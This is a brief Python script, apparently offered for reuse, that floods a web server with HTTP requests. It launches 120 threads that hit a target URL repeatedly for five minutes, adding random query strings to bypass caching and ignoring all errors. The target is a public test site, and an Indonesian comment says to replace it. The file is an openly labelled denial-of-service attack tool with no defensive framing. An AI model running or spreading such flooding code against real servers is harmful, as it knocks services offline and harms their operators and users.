import requests
import threading
import time

target = "http://testphp.vulnweb.com"  # GANTI INI
thread_count = 120
duration = 300

def attack():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target, timeout=3)
            requests.get(f"{target}?r={time.time()}", timeout=2)
        except:
            pass
        time.sleep(0.01)

print(f"[🔥] Attacking {target}")
for i in range(thread_count):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

time.sleep(duration)
print("[✅] Done")
